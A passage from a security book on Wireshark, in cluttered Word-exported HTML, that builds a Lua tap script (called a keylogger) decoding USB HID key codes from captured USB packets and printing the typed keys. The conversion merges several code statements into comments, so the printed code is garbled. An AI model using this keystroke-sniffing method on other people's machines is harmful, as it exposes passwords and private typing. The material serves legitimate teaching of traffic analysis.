going up to 6. At this point, it is probably reasonable to assume that these are the key presses. You can verify this by pressing A again and checking to see if some data is going to the host with the number 4. The problem we have now <a name="_bookmark580" ></a>is that this isn&#8217;t an ASCII code, as A should map to 0x61. One way to figure out which keys are which is by pressing every key on the keyboard and recording the response. While this might sound like it would be a lot of fun, that would be cruel. It turns out that USB defines a standard for input devices such as mice, joysticks, and keyboards. These devices should all be following the USB Human Interface Device (HID) class specification. To save you some time reading the specification, it turns out that they define key codes, which tells how the USB key codes map to the actual keys on the keyboard.<a name="_bookmark581" ></a>&nbsp;</span><span><a href="#_bookmark582" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-16</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows a snippet of the key codes from the HID standard, which verifies that we are correct in that 0x04 maps to &#8216;a&#8217; or &#8216;A.&#8217;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section295" ><p class=MsoBodyText  style="margin-left:9.5000pt;" ><img width="775"  height="307"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker378427.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark582" ></a><span><a href="#_bookmark581" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-16:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >HID key codes</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><a name="_bookmark583" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At this point, we have enough information to start building our keylogger. The first thing we want to do is define our fields. In our case, all we are concerned with is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >usb.capdata</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which is the data payload for the USB packets parsed by Wireshark. With our field defined, we can define our </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init_listener </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function and create our Listener/tap. We will want our Listener to only process USB packets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.6500pt;margin-right:145.3500pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--we want to capture usb data for each packet local usbdata = Field.new("usb.capdata")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--the listener function, will create our tap local function init_listener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("[*] Started KeySniffing&#8230;\n")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--only listen for usb packets local tap = Listener.new("usb")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:10.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now, we will define the Listener&#8217;s packet function, which is the bulk of our processing. Here, we will verify that we have the USB data and then process it to determine the key that was pressed. The data we get will be in the form of </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%x:%x:%x:%x</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >%x </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >being a hex number. By looking at this data, it is readily apparent that the key pressed will be the third hex number. So, to get this, we &#8220;split&#8221; the USB data on the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >':'</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field. This gives us an ordered table of hex bytes. Then we can pull out the third item in the table, allowing us to map this hex byte to the corresponding keyboard key press and print it to the screen.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section296" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--called for every packet meeting the filter set for the Listener(), so usb packets</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function tap.packet(pinfo, tvb)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:86.3000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--list from </span><span><a href="http://www.usb.org/developers/" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http://www.usb.org/developers/</span></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&nbsp;devclass_docs/Hut1_11.pdf</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:86.3000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local keys = "???? abcdefghijklmnopqrstuvwxyz1234567890</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >\n??\t -=[]\\?;??,./"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:230.2500pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--get the usb.capdata local data = usbdata()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--make sure the packet actually has a usb.capdata</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section297" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >field</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:223.0500pt;margin-left:36.7500pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if data ~= nil then local keycodes = {} local i = 0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--match on everything that is a hex byte %x and</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section298" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >add it to the table</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--this works b/c data is in format %x:%x:%x:%x</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-<a name="_bookmark584" ></a>-it is effectively pythons split(':') function for v in string.gmatch(tostring(data), "%x+") do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:223.0500pt;margin-left:151.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >i = i + 1 keycodes[i] = v</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section299" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:10.9000pt;margin-right:0.9500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >value values</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--make sure we got a keypress, which is the 3rd</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:1.8000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:27.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--this works on a table b/c we are using int key if #keycodes &#60; 3 then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section300" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--convert the hex key to decimal</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local code = tonumber(keycodes[3], 16) + 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:130.5000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--get the right key mapping local key = keys:sub(code,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >code)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--as long as it isn't '?' lets print it to stdout if key ~= '?' then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:237.4500pt;margin-left:151.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >io.write(key) io.flush()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section301" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  align=right  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:0.0000pt;text-indent:0.0000pt;text-align:right;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:5.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" 